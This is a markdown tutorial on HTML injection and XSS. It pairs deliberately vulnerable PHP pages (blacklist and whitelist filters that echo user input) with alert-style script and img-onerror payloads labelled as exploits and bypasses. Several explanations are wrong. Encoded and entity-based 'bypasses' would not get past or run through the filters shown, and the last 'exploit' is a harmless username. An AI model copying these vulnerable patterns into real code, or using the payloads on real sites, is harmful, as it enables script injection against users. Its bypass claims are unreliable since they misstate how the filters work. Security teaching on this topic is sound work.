
# 🔴 HTML Injection — Blacklist (GET & POST)
---

## 🚫 Blacklist-Based Filtering (GET Method)

```php
html-injection-black-list-get.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Blacklist - GET</title>
</head>
<body>
    <h1>HTML Injection Blacklist - GET</h1>
    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = preg_replace("/<|>/", "", $_REQUEST['user']); // Removes < and >
        echo "<h2>" . $user_name . "!!</h2>";
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```url
http://example.com/html-injection-black-list-get.php?user=<h1>XSS</h1>
```

### 🛠️ Bypass Technique:

Use encoded payload:

```
<script>alert('XSS')</script>  
→ Encoded as: %3Cscript%3Ealert('XSS')%3C/script%3E
```

> ⚠️ **Weak blacklist** — only removes `<` and `>`, but many other dangerous inputs like quotes, event handlers, or `img` tags can still execute malicious code.

---

## 🚫 Blacklist-Based Filtering (POST Method)
```php
html-injection-black-list-post.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Blacklist - POST</title>
</head>
<body>
    <h1>HTML Injection Blacklist - POST</h1>
    <form action="html-injection-black-list-post.php" method="POST">
        User Name: <input type="text" name="user"><br>
        <input type="submit" value="Login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = preg_replace("/<|>/", "", $_REQUEST['user']);
        echo "<h2>" . $user_name . "!!</h2>";
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```php
<h1>Hello!</h1>
```
```php  
<img src=x onerror=alert('XSS')>
```

### 🛠️ Bypass Technique:

> Use HTML entities:

```php
&lt;img src=x onerror=alert(1)&gt;
```

> ⚠️ **Encoding evasion** — Blacklists are easy to bypass using encoded characters or alternative syntax.

---

# 🔴 HTML Injection — Whitelist 

> ⚠️ Weak Whitelist Example — Still Vulnerable
```php
html-injection-white-list.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Whitelist</title>
</head>
<body>
    <h1>HTML Injection Whitelist</h1>
    <form action="html-injection-white-list.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="Login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];
        if (!preg_match('/[a-z\d_\-\.]/i', $user_name)) {
            die("Don't try to Inject Code");
        } else {
            echo "<h2>" . $user_name . "!!</h2>";
        }
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```php
<h1>Injected</h1>
```

> ✅ Passes because characters like `h`, `1`, `I`, etc., are in the allowed set.

### 🛠️ Bypass Technique:

```php
a<script>alert(1)</script>
```

> ⚠️ The regex only *checks if input contains* allowed characters — it doesn’t reject bad ones **outside** the list.

---

## 🔥 `html-injection-white-list2.php` — Completely Vulnerable
```php
html-injection-white-list2.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>Html Injection White List - 2</title>
</head>
<body>
    <h1>Html Injection White List - 2</h1>
    <form action="html-injection-white-list2.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

        // ❌ Weak Regex: Only checks if ONE allowed char is present
        if (preg_match('/[a-z\d_\.\-]/i', $user_name)) {
            echo '<h2>' . $user_name . '!</h2>'; // No sanitization
        } else {
            die("Don't try to Inject Code");
        }
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```php
a<script>alert('XSS')</script>
```

> ⚠️ Only one matching character (e.g., `a`) is enough for input to be accepted. Full injection follows.

---

## 🛡️ `html-injection-white-list3.php` — Improved, But Still Risky
```php
html-injection-white-list3.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>Html Injection White List - 3</title>
</head>
<body>
    <h1>Html Injection White List - 3</h1>
    <form action="html-injection-white-list3.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

        // Strict Regex: Matches only full valid string
        if (!preg_match('/^[a-z\d\.\-\_]*$/i', $user_name)) {
            die("Don't try to Inject Code");
        } else {
            echo "<h2>" . $user_name . "!</h2>";
        }
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```php
admin_user-12
```

